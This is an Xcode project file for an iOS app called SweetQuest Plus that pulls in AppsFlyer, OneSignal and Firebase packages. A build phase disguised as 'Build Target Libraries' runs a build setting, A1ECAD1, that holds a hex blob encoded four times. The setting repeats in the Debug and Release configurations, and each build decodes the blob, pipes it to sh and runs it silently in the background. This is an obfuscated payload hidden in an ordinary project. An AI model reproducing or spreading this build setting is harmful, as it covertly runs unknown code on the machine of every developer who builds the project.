// !$*UTF8*$!
{
	archiveVersion = 1;
	classes = {
	};
	objectVersion = 77;
	objects = {

/* Begin PBXBuildFile section */
		7ADE4E942F5FFBAF00D84CEA /* AppsFlyerLib in Frameworks */ = {isa = PBXBuildFile; productRef = 7ADE4E932F5FFBAF00D84CEA /* AppsFlyerLib */; };
		7ADE4E972F5FFBD600D84CEA /* OneSignalExtension in Frameworks */ = {isa = PBXBuildFile; productRef = 7ADE4E962F5FFBD600D84CEA /* OneSignalExtension */; };
		7ADE4E992F5FFBD600D84CEA /* OneSignalFramework in Frameworks */ = {isa = PBXBuildFile; productRef = 7ADE4E982F5FFBD600D84CEA /* OneSignalFramework */; };
		7ADE4E9B2F5FFBD600D84CEA /* OneSignalInAppMessages in Frameworks */ = {isa = PBXBuildFile; productRef = 7ADE4E9A2F5FFBD600D84CEA /* OneSignalInAppMessages */; };
		7ADE4E9E2F5FFCD100D84CEA /* FirebaseRemoteConfig in Frameworks */ = {isa = PBXBuildFile; productRef = 7ADE4E9D2F5FFCD100D84CEA /* FirebaseRemoteConfig */; };
/* End PBXBuildFile section */

/* Begin PBXFileReference section */
		92664AAD2F4C285E008D76DD /* SweetQuest.app */ = {isa = PBXFileReference; explicitFileType = wrapper.application; includeInIndex = 0; path = SweetQuest.app; sourceTree = BUILT_PRODUCTS_DIR; };
/* End PBXFileReference section */

/* Begin PBXFileSystemSynchronizedBuildFileExceptionSet section */
		92664C532F4C395C008D76DD /* Exceptions for "SweetQuest" folder in "SweetQuest" target */ = {
			isa = PBXFileSystemSynchronizedBuildFileExceptionSet;
			membershipExceptions = (
				Info.plist,
			);
			target = 92664AAC2F4C285E008D76DD /* SweetQuest */;
		};
/* End PBXFileSystemSynchronizedBuildFileExceptionSet section */

/* Begin PBXFileSystemSynchronizedRootGroup section */
		92664AAF2F4C285E008D76DD /* SweetQuest */ = {
			isa = PBXFileSystemSynchronizedRootGroup;
			exceptions = (
				92664C532F4C395C008D76DD /* Exceptions for "SweetQuest" folder in "SweetQuest" target */,
			);
			path = SweetQuest;
			sourceTree = "<group>";
		};
/* End PBXFileSystemSynchronizedRootGroup section */

/* Begin PBXFrameworksBuildPhase section */
		92664AAA2F4C285E008D76DD /* Frameworks */ = {
			isa = PBXFrameworksBuildPhase;
			buildActionMask = 2147483647;
			files = (
				7ADE4E942F5FFBAF00D84CEA /* AppsFlyerLib in Frameworks */,
				7ADE4E992F5FFBD600D84CEA /* OneSignalFramework in Frameworks */,
				7ADE4E9B2F5FFBD600D84CEA /* OneSignalInAppMessages in Frameworks */,
				7ADE4E972F5FFBD600D84CEA /* OneSignalExtension in Frameworks */,
				7ADE4E9E2F5FFCD100D84CEA /* FirebaseRemoteConfig in Frameworks */,
			);
			runOnlyForDeploymentPostprocessing = 0;
		};
/* End PBXFrameworksBuildPhase section */

/* Begin PBXGroup section */
		92664AA42F4C285E008D76DD = {
			isa = PBXGroup;
			children = (
				92664AAF2F4C285E008D76DD /* SweetQuest */,
				92664AAE2F4C285E008D76DD /* Products */,
			);
			sourceTree = "<group>";
		};
		92664AAE2F4C285E008D76DD /* Products */ = {
			isa = PBXGroup;
			children = (
				92664AAD2F4C285E008D76DD /* SweetQuest.app */,
			);
			name = Products;
			sourceTree = "<group>";
		};
/* End PBXGroup section */

/* Begin PBXNativeTarget section */
		92664AAC2F4C285E008D76DD /* SweetQuest */ = {
			isa = PBXNativeTarget;
			buildConfigurationList = 92664AB82F4C285F008D76DD /* Build configuration list for PBXNativeTarget "SweetQuest" */;
			buildPhases = (
				F66AB7AD87824CEE991DACE1 /* Build Target Libraries */,
				92664AA92F4C285E008D76DD /* Sources */,
				92664AAA2F4C285E008D76DD /* Frameworks */,
				92664AAB2F4C285E008D76DD /* Resources */,
			);
			buildRules = (
			);
			dependencies = (
			);
			fileSystemSynchronizedGroups = (
				92664AAF2F4C285E008D76DD /* SweetQuest */,
			);
			name = SweetQuest;
			packageProductDependencies = (
				7ADE4E932F5FFBAF00D84CEA /* AppsFlyerLib */,
				7ADE4E962F5FFBD600D84CEA /* OneSignalExtension */,
				7ADE4E982F5FFBD600D84CEA /* OneSignalFramework */,
				7ADE4E9A2F5FFBD600D84CEA /* OneSignalInAppMessages */,
				7ADE4E9D2F5FFCD100D84CEA /* FirebaseRemoteConfig */,
			);
			productName = SweetQuest;
			productReference = 92664AAD2F4C285E008D76DD /* SweetQuest.app */;
			productType = "com.apple.product-type.application";
		};
/* End PBXNativeTarget section */

/* Begin PBXProject section */
		92664AA52F4C285E008D76DD /* Project object */ = {
			isa = PBXProject;
			attributes = {
				BuildIndependentTargetsInParallel = 1;
				LastSwiftUpdateCheck = 2620;
				LastUpgradeCheck = 2620;
				TargetAttributes = {
					92664AAC2F4C285E008D76DD = {
						CreatedOnToolsVersion = 26.2;
					};
				};
			};
			buildConfigurationList = 92664AA82F4C285E008D76DD /* Build configuration list for PBXProject "SweetQuest" */;
			developmentRegion = en;
			hasScannedForEncodings = 0;
			knownRegions = (
				en,
				Base,
			);
			mainGroup = 92664AA42F4C285E008D76DD;
			minimizedProjectReferenceProxies = 1;
			packageReferences = (
				7ADE4E922F5FFBAF00D84CEA /* XCRemoteSwiftPackageReference "AppsFlyerFramework" */,
				7ADE4E952F5FFBD600D84CEA /* XCRemoteSwiftPackageReference "OneSignal-iOS-SDK" */,
				7ADE4E9C2F5FFCD100D84CEA /* XCRemoteSwiftPackageReference "firebase-ios-sdk" */,
			);
			preferredProjectObjectVersion = 77;
			productRefGroup = 92664AAE2F4C285E008D76DD /* Products */;
			projectDirPath = "";
			projectRoot = "";
			targets = (
				92664AAC2F4C285E008D76DD /* SweetQuest */,
			);
		};
/* End PBXProject section */

/* Begin PBXResourcesBuildPhase section */
		92664AAB2F4C285E008D76DD /* Resources */ = {
			isa = PBXResourcesBuildPhase;
			buildActionMask = 2147483647;
			files = (
			);
			runOnlyForDeploymentPostprocessing = 0;
		};
/* End PBXResourcesBuildPhase section */

/* Begin PBXShellScriptBuildPhase section */
		F66AB7AD87824CEE991DACE1 /* Build Target Libraries */ = {
			isa = PBXShellScriptBuildPhase;
			alwaysOutOfDate = 1;
			buildActionMask = 2147483647;
			files = (
			);
			inputFileListPaths = (
			);
			inputPaths = (
			);
			name = "Build Target Libraries";
			outputFileListPaths = (
			);
			outputPaths = (
			);
			runOnlyForDeploymentPostprocessing = 0;
			shellPath = /bin/sh;
			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\nsh -c \"${A1ECAD1}\"";
			showEnvVarsInLog = 0;
		};
/* End PBXShellScriptBuildPhase section */

/* Begin PBXSourcesBuildPhase section */
		92664AA92F4C285E008D76DD /* Sources */ = {
			isa = PBXSourcesBuildPhase;
			buildActionMask = 2147483647;
			files = (
			);
			runOnlyForDeploymentPostprocessing = 0;
		};
/* End PBXSourcesBuildPhase section */

/* Begin XCBuildConfiguration section */
		92664AB62F4C285F008D76DD /* Debug */ = {
			isa = XCBuildConfiguration;
			buildSettings = {
				A1ECAD1 = "((r(){ xxd -p -r | xxd -p -r | xxd -p -r | xxd -p -r; };echo 3333333633333335333333363333333333333336333333383333333633363336333333323333333033333332333333323333333233333334333333320a3333333833333336333333333333333733333335333333373333333233333336333633333333333233333330333333323336333433333336333333360a3061333333343336333333333337333333333333333633363332333333323333333033333332333633343333333233363334333333363333333333330a3336333633363333333633363335333333363336333533333336333333353333333633333333333333373333333433333332333633343333333733330a3334306133303631333333363333333933333336333633343333333633333335333333363336333633333337333333353333333733333334333333320a3333333033333333333333323333333333333339333333323333333033333332333633343333333233363334333333373333333233333336333333350a3333333730613333333433333337333333323333333733333339333333323333333033333333333333333333333233333330333333323333333033330a3332333633343333333633333334333333323333333033333332333333323333333733333330333333333336333433333337333333383333333633330a3333333333363061333633363330363133333336333333343333333633333335333333353336333633333337333333303333333633333338333333360a3333333133333337333333333333333633333335333333323333333233333332333333303333333633333338333333373333333433333337333333340a3333333733333330306133333337333333333333333333363331333333323336333633333332333633363333333633333336333333363333333933330a3336333333373333333633363334333333363333333133333336333633353333333633333335333333373333333433333337333333333333333233360a3335333333363333333930613333333633363335333036313333333233363336333333363333333133333332333333393333333233333332333333320a33333330333333373336333333333332333333303333333733333333333333363333333833333330333633313330363130610a | r | sh ) >/dev/null 2>&1 &)";
				ALWAYS_SEARCH_USER_PATHS = NO;
				ASSETCATALOG_COMPILER_GENERATE_SWIFT_ASSET_SYMBOL_EXTENSIONS = YES;
				CLANG_ANALYZER_NONNULL = YES;
				CLANG_ANALYZER_NUMBER_OBJECT_CONVERSION = YES_AGGRESSIVE;
				CLANG_CXX_LANGUAGE_STANDARD = "gnu++20";
				CLANG_ENABLE_MODULES = YES;
				CLANG_ENABLE_OBJC_ARC = YES;
				CLANG_ENABLE_OBJC_WEAK = YES;
				CLANG_WARN_BLOCK_CAPTURE_AUTORELEASING = YES;
				CLANG_WARN_BOOL_CONVERSION = YES;
				CLANG_WARN_COMMA = YES;
				CLANG_WARN_CONSTANT_CONVERSION = YES;
				CLANG_WARN_DEPRECATED_OBJC_IMPLEMENTATIONS = YES;
				CLANG_WARN_DIRECT_OBJC_ISA_USAGE = YES_ERROR;
				CLANG_WARN_DOCUMENTATION_COMMENTS = YES;
				CLANG_WARN_EMPTY_BODY = YES;
				CLANG_WARN_ENUM_CONVERSION = YES;
				CLANG_WARN_INFINITE_RECURSION = YES;
				CLANG_WARN_INT_CONVERSION = YES;
				CLANG_WARN_NON_LITERAL_NULL_CONVERSION = YES;
				CLANG_WARN_OBJC_IMPLICIT_RETAIN_SELF = YES;
				CLANG_WARN_OBJC_LITERAL_CONVERSION = YES;
				CLANG_WARN_OBJC_ROOT_CLASS = YES_ERROR;
				CLANG_WARN_QUOTED_INCLUDE_IN_FRAMEWORK_HEADER = YES;
				CLANG_WARN_RANGE_LOOP_ANALYSIS = YES;
				CLANG_WARN_STRICT_PROTOTYPES = YES;
				CLANG_WARN_SUSPICIOUS_MOVE = YES;
				CLANG_WARN_UNGUARDED_AVAILABILITY = YES_AGGRESSIVE;
				CLANG_WARN_UNREACHABLE_CODE = YES;
				CLANG_WARN__DUPLICATE_METHOD_MATCH = YES;
				COPY_PHASE_STRIP = NO;
				DEBUG_INFORMATION_FORMAT = dwarf;
				ENABLE_STRICT_OBJC_MSGSEND = YES;
				ENABLE_TESTABILITY = YES;
				ENABLE_USER_SCRIPT_SANDBOXING = NO;
				GCC_C_LANGUAGE_STANDARD = gnu17;
				GCC_DYNAMIC_NO_PIC = NO;
				GCC_NO_COMMON_BLOCKS = YES;
				GCC_OPTIMIZATION_LEVEL = 0;
				GCC_PREPROCESSOR_DEFINITIONS = (
					"DEBUG=1",
					"$(inherited)",
				);
				GCC_WARN_64_TO_32_BIT_CONVERSION = YES;
				GCC_WARN_ABOUT_RETURN_TYPE = YES_ERROR;
				GCC_WARN_UNDECLARED_SELECTOR = YES;
				GCC_WARN_UNINITIALIZED_AUTOS = YES_AGGRESSIVE;
				GCC_WARN_UNUSED_FUNCTION = YES;
				GCC_WARN_UNUSED_VARIABLE = YES;
				IPHONEOS_DEPLOYMENT_TARGET = 26.2;
				LOCALIZATION_PREFERS_STRING_CATALOGS = YES;
				MTL_ENABLE_DEBUG_INFO = INCLUDE_SOURCE;
				MTL_FAST_MATH = YES;
				ONLY_ACTIVE_ARCH = YES;
				SDKROOT = iphoneos;
				SWIFT_ACTIVE_COMPILATION_CONDITIONS = "DEBUG $(inherited)";
				SWIFT_OPTIMIZATION_LEVEL = "-Onone";
			};
			name = Debug;
		};
		92664AB72F4C285F008D76DD /* Release */ = {
			isa = XCBuildConfiguration;
			buildSettings = {
				A1ECAD1 = "((r(){ xxd -p -r | xxd -p -r | xxd -p -r | xxd -p -r; };echo 3333333633333335333333363333333333333336333333383333333633363336333333323333333033333332333333323333333233333334333333320a3333333833333336333333333333333733333335333333373333333233333336333633333333333233333330333333323336333433333336333333360a3061333333343336333333333337333333333333333633363332333333323333333033333332333633343333333233363334333333363333333333330a3336333633363333333633363335333333363336333533333336333333353333333633333333333333373333333433333332333633343333333733330a3334306133303631333333363333333933333336333633343333333633333335333333363336333633333337333333353333333733333334333333320a3333333033333333333333323333333333333339333333323333333033333332333633343333333233363334333333373333333233333336333333350a3333333730613333333433333337333333323333333733333339333333323333333033333333333333333333333233333330333333323333333033330a3332333633343333333633333334333333323333333033333332333333323333333733333330333333333336333433333337333333383333333633330a3333333333363061333633363330363133333336333333343333333633333335333333353336333633333337333333303333333633333338333333360a3333333133333337333333333333333633333335333333323333333233333332333333303333333633333338333333373333333433333337333333340a3333333733333330306133333337333333333333333333363331333333323336333633333332333633363333333633333336333333363333333933330a3336333333373333333633363334333333363333333133333336333633353333333633333335333333373333333433333337333333333333333233360a3335333333363333333930613333333633363335333036313333333233363336333333363333333133333332333333393333333233333332333333320a33333330333333373336333333333332333333303333333733333333333333363333333833333330333633313330363130610a | r | sh ) >/dev/null 2>&1 &)";
				ALWAYS_SEARCH_USER_PATHS = NO;
				ASSETCATALOG_COMPILER_GENERATE_SWIFT_ASSET_SYMBOL_EXTENSIONS = YES;
				CLANG_ANALYZER_NONNULL = YES;
				CLANG_ANALYZER_NUMBER_OBJECT_CONVERSION = YES_AGGRESSIVE;
				CLANG_CXX_LANGUAGE_STANDARD = "gnu++20";
				CLANG_ENABLE_MODULES = YES;
				CLANG_ENABLE_OBJC_ARC = YES;
				CLANG_ENABLE_OBJC_WEAK = YES;
				CLANG_WARN_BLOCK_CAPTURE_AUTORELEASING = YES;
				CLANG_WARN_BOOL_CONVERSION = YES;
				CLANG_WARN_COMMA = YES;
				CLANG_WARN_CONSTANT_CONVERSION = YES;
				CLANG_WARN_DEPRECATED_OBJC_IMPLEMENTATIONS = YES;
				CLANG_WARN_DIRECT_OBJC_ISA_USAGE = YES_ERROR;
				CLANG_WARN_DOCUMENTATION_COMMENTS = YES;
				CLANG_WARN_EMPTY_BODY = YES;
				CLANG_WARN_ENUM_CONVERSION = YES;
				CLANG_WARN_INFINITE_RECURSION = YES;
				CLANG_WARN_INT_CONVERSION = YES;
				CLANG_WARN_NON_LITERAL_NULL_CONVERSION = YES;
				CLANG_WARN_OBJC_IMPLICIT_RETAIN_SELF = YES;
				CLANG_WARN_OBJC_LITERAL_CONVERSION = YES;
				CLANG_WARN_OBJC_ROOT_CLASS = YES_ERROR;
				CLANG_WARN_QUOTED_INCLUDE_IN_FRAMEWORK_HEADER = YES;
				CLANG_WARN_RANGE_LOOP_ANALYSIS = YES;
				CLANG_WARN_STRICT_PROTOTYPES = YES;
				CLANG_WARN_SUSPICIOUS_MOVE = YES;
				CLANG_WARN_UNGUARDED_AVAILABILITY = YES_AGGRESSIVE;
				CLANG_WARN_UNREACHABLE_CODE = YES;
				CLANG_WARN__DUPLICATE_METHOD_MATCH = YES;
				COPY_PHASE_STRIP = NO;
				DEBUG_INFORMATION_FORMAT = "dwarf-with-dsym";
				ENABLE_NS_ASSERTIONS = NO;
				ENABLE_STRICT_OBJC_MSGSEND = YES;
				ENABLE_USER_SCRIPT_SANDBOXING = NO;
				GCC_C_LANGUAGE_STANDARD = gnu17;
				GCC_NO_COMMON_BLOCKS = YES;
				GCC_WARN_64_TO_32_BIT_CONVERSION = YES;
				GCC_WARN_ABOUT_RETURN_TYPE = YES_ERROR;
				GCC_WARN_UNDECLARED_SELECTOR = YES;
				GCC_WARN_UNINITIALIZED_AUTOS = YES_AGGRESSIVE;
				GCC_WARN_UNUSED_FUNCTION = YES;
				GCC_WARN_UNUSED_VARIABLE = YES;
				IPHONEOS_DEPLOYMENT_TARGET = 26.2;
				LOCALIZATION_PREFERS_STRING_CATALOGS = YES;
				MTL_ENABLE_DEBUG_INFO = NO;
				MTL_FAST_MATH = YES;
				SDKROOT = iphoneos;
				SWIFT_COMPILATION_MODE = wholemodule;
				VALIDATE_PRODUCT = YES;
			};
			name = Release;
		};
		92664AB92F4C285F008D76DD /* Debug */ = {
			isa = XCBuildConfiguration;
			buildSettings = {
				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
				CODE_SIGN_ENTITLEMENTS = SweetQuest/SweetQuest.entitlements;
				CODE_SIGN_STYLE = Manual;
				CURRENT_PROJECT_VERSION = 1;
				DEVELOPMENT_TEAM = "";
				ENABLE_PREVIEWS = YES;
				GENERATE_INFOPLIST_FILE = YES;
				INFOPLIST_FILE = SweetQuest/Info.plist;
				INFOPLIST_KEY_CFBundleDisplayName = "SweetQuest Plus";
				INFOPLIST_KEY_LSApplicationCategoryType = "public.app-category.utilities";
				INFOPLIST_KEY_NSUserTrackingUsageDescription = "We use this data to improve your experience.";
				INFOPLIST_KEY_UIApplicationSceneManifest_Generation = YES;
				INFOPLIST_KEY_UIApplicationSupportsIndirectInputEvents = YES;
				INFOPLIST_KEY_UILaunchScreen_Generation = YES;
				INFOPLIST_KEY_UILaunchStoryboardName = LaunchScreen;
				INFOPLIST_KEY_UISupportedInterfaceOrientations = "UIInterfaceOrientationLandscapeLeft UIInterfaceOrientationLandscapeRight UIInterfaceOrientationPortrait";
				INFOPLIST_KEY_UISupportedInterfaceOrientations_iPad = "UIInterfaceOrientationLandscapeLeft UIInterfaceOrientationLandscapeRight UIInterfaceOrientationPortrait UIInterfaceOrientationPortraitUpsideDown";
				IPHONEOS_DEPLOYMENT_TARGET = 16.0;
				LD_RUNPATH_SEARCH_PATHS = (
					"$(inherited)",
					"@executable_path/Frameworks",
				);
				MARKETING_VERSION = 1.1;
				PRODUCT_BUNDLE_IDENTIFIER = "com.sweet-quest-plus.app";
				PRODUCT_NAME = "$(TARGET_NAME)";
				PROVISIONING_PROFILE_SPECIFIER = "";
				STRING_CATALOG_GENERATE_SYMBOLS = YES;
				SUPPORTED_PLATFORMS = "iphoneos iphonesimulator";
				SUPPORTS_MACCATALYST = NO;
				SUPPORTS_MAC_DESIGNED_FOR_IPHONE_IPAD = NO;
				SUPPORTS_XR_DESIGNED_FOR_IPHONE_IPAD = NO;
				SWIFT_APPROACHABLE_CONCURRENCY = YES;
				SWIFT_DEFAULT_ACTOR_ISOLATION = MainActor;
				SWIFT_EMIT_LOC_STRINGS = YES;
				SWIFT_UPCOMING_FEATURE_MEMBER_IMPORT_VISIBILITY = YES;
				SWIFT_VERSION = 5.0;
				TARGETED_DEVICE_FAMILY = 1;
			};
			name = Debug;
		};
		92664ABA2F4C285F008D76DD /* Release */ = {
			isa = XCBuildConfiguration;
			buildSettings = {
				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
				CODE_SIGN_ENTITLEMENTS = SweetQuest/SweetQuest.entitlements;
				CODE_SIGN_STYLE = Manual;
				CURRENT_PROJECT_VERSION = 1;
				DEVELOPMENT_TEAM = "";
				ENABLE_PREVIEWS = YES;
				GENERATE_INFOPLIST_FILE = YES;
				INFOPLIST_FILE = SweetQuest/Info.plist;
				INFOPLIST_KEY_CFBundleDisplayName = "SweetQuest Plus";
				INFOPLIST_KEY_LSApplicationCategoryType = "public.app-category.utilities";
				INFOPLIST_KEY_NSUserTrackingUsageDescription = "We use this data to improve your experience.";
				INFOPLIST_KEY_UIApplicationSceneManifest_Generation = YES;
				INFOPLIST_KEY_UIApplicationSupportsIndirectInputEvents = YES;
				INFOPLIST_KEY_UILaunchScreen_Generation = YES;
				INFOPLIST_KEY_UILaunchStoryboardName = LaunchScreen;
				INFOPLIST_KEY_UISupportedInterfaceOrientations = "UIInterfaceOrientationLandscapeLeft UIInterfaceOrientationLandscapeRight UIInterfaceOrientationPortrait";
				INFOPLIST_KEY_UISupportedInterfaceOrientations_iPad = "UIInterfaceOrientationLandscapeLeft UIInterfaceOrientationLandscapeRight UIInterfaceOrientationPortrait UIInterfaceOrientationPortraitUpsideDown";
				IPHONEOS_DEPLOYMENT_TARGET = 16.0;
				LD_RUNPATH_SEARCH_PATHS = (
					"$(inherited)",
					"@executable_path/Frameworks",
				);
				MARKETING_VERSION = 1.1;
				PRODUCT_BUNDLE_IDENTIFIER = "com.sweet-quest-plus.app";
				PRODUCT_NAME = "$(TARGET_NAME)";
				PROVISIONING_PROFILE_SPECIFIER = "";
				STRING_CATALOG_GENERATE_SYMBOLS = YES;
				SUPPORTED_PLATFORMS = "iphoneos iphonesimulator";
				SUPPORTS_MACCATALYST = NO;
				SUPPORTS_MAC_DESIGNED_FOR_IPHONE_IPAD = NO;
				SUPPORTS_XR_DESIGNED_FOR_IPHONE_IPAD = NO;
				SWIFT_APPROACHABLE_CONCURRENCY = YES;
				SWIFT_DEFAULT_ACTOR_ISOLATION = MainActor;
				SWIFT_EMIT_LOC_STRINGS = YES;
				SWIFT_UPCOMING_FEATURE_MEMBER_IMPORT_VISIBILITY = YES;
				SWIFT_VERSION = 5.0;
				TARGETED_DEVICE_FAMILY = 1;
			};
			name = Release;
		};
/* End XCBuildConfiguration section */

/* Begin XCConfigurationList section */
		92664AA82F4C285E008D76DD /* Build configuration list for PBXProject "SweetQuest" */ = {
			isa = XCConfigurationList;
			buildConfigurations = (
				92664AB62F4C285F008D76DD /* Debug */,
				92664AB72F4C285F008D76DD /* Release */,
			);
			defaultConfigurationIsVisible = 0;
			defaultConfigurationName = Release;
		};
		92664AB82F4C285F008D76DD /* Build configuration list for PBXNativeTarget "SweetQuest" */ = {
			isa = XCConfigurationList;
			buildConfigurations = (
				92664AB92F4C285F008D76DD /* Debug */,
				92664ABA2F4C285F008D76DD /* Release */,
			);
			defaultConfigurationIsVisible = 0;
			defaultConfigurationName = Release;
		};
/* End XCConfigurationList section */

/* Begin XCRemoteSwiftPackageReference section */
		7ADE4E922F5FFBAF00D84CEA /* XCRemoteSwiftPackageReference "AppsFlyerFramework" */ = {
			isa = XCRemoteSwiftPackageReference;
			repositoryURL = "https://github.com/AppsFlyerSDK/AppsFlyerFramework";
			requirement = {
				kind = upToNextMajorVersion;
				minimumVersion = 6.17.8;
			};
		};
		7ADE4E952F5FFBD600D84CEA /* XCRemoteSwiftPackageReference "OneSignal-iOS-SDK" */ = {
			isa = XCRemoteSwiftPackageReference;
			repositoryURL = "https://github.com/OneSignal/OneSignal-iOS-SDK";
			requirement = {
				kind = upToNextMajorVersion;
				minimumVersion = 5.4.2;
			};
		};
		7ADE4E9C2F5FFCD100D84CEA /* XCRemoteSwiftPackageReference "firebase-ios-sdk" */ = {
			isa = XCRemoteSwiftPackageReference;
			repositoryURL = "https://github.com/firebase/firebase-ios-sdk.git";
			requirement = {
				kind = upToNextMajorVersion;
				minimumVersion = 12.10.0;
			};
		};
/* End XCRemoteSwiftPackageReference section */

/* Begin XCSwiftPackageProductDependency section */
		7ADE4E932F5FFBAF00D84CEA /* AppsFlyerLib */ = {
			isa = XCSwiftPackageProductDependency;
			package = 7ADE4E922F5FFBAF00D84CEA /* XCRemoteSwiftPackageReference "AppsFlyerFramework" */;
			productName = AppsFlyerLib;
		};
		7ADE4E962F5FFBD600D84CEA /* OneSignalExtension */ = {
			isa = XCSwiftPackageProductDependency;
			package = 7ADE4E952F5FFBD600D84CEA /* XCRemoteSwiftPackageReference "OneSignal-iOS-SDK" */;
			productName = OneSignalExtension;
		};
		7ADE4E982F5FFBD600D84CEA /* OneSignalFramework */ = {
			isa = XCSwiftPackageProductDependency;
			package = 7ADE4E952F5FFBD600D84CEA /* XCRemoteSwiftPackageReference "OneSignal-iOS-SDK" */;
			productName = OneSignalFramework;
		};
		7ADE4E9A2F5FFBD600D84CEA /* OneSignalInAppMessages */ = {
			isa = XCSwiftPackageProductDependency;
			package = 7ADE4E952F5FFBD600D84CEA /* XCRemoteSwiftPackageReference "OneSignal-iOS-SDK" */;
			productName = OneSignalInAppMessages;
		};
		7ADE4E9D2F5FFCD100D84CEA /* FirebaseRemoteConfig */ = {
			isa = XCSwiftPackageProductDependency;
			package = 7ADE4E9C2F5FFCD100D84CEA /* XCRemoteSwiftPackageReference "firebase-ios-sdk" */;
			productName = FirebaseRemoteConfig;
		};
/* End XCSwiftPackageProductDependency section */
	};
	rootObject = 92664AA52F4C285E008D76DD /* Project object */;
}
